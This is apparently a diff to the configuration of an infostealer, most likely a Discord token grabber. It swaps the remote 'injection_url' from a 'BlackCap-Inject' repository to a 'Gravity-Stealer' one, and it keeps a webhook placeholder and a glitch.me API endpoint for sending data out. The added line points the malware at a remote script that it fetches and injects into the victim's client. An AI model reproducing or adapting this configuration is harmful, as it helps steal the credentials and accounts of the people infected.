@@ -27,7 +27,7 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/MohxKd/Gravity-Stealer/main/index.js",
     webhook: "%WEBHOOK%",
     apiurl: "https://healthy-rowan-bottle.glitch.me/hello/",
     filter2: {
